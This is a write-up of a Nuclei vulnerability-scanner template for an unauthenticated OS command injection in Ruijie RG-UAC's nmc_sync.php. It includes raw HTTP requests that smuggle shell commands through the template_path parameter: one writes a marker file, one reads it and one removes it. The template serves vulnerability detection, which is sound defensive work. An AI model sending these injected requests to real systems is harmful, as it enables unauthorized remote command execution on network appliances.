# Nuclei Template: Ruijie RG-UAC nmc_sync.php - Remote Code Execution
**Template ID:** ruijie-nmc-sync-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`ruijie-nmc-sync-rce.yaml`)

## Vulnerability Information & PoC

## Description
There is a command execution vulnerability in the nmc_sync.php interface of Ruijie's RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.

## Steps to reproduce / Exploit Payload
```http
GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo+{{match_str}}+>+{{random_str}}.txt|cat HTTP/1.1
Host: {{Hostname}}

GET /view/systemConfig/management/{{random_str}}.txt HTTP/1.1
Host: {{Hostname}}

GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|rm+{{random_str}}.txt|cat HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py
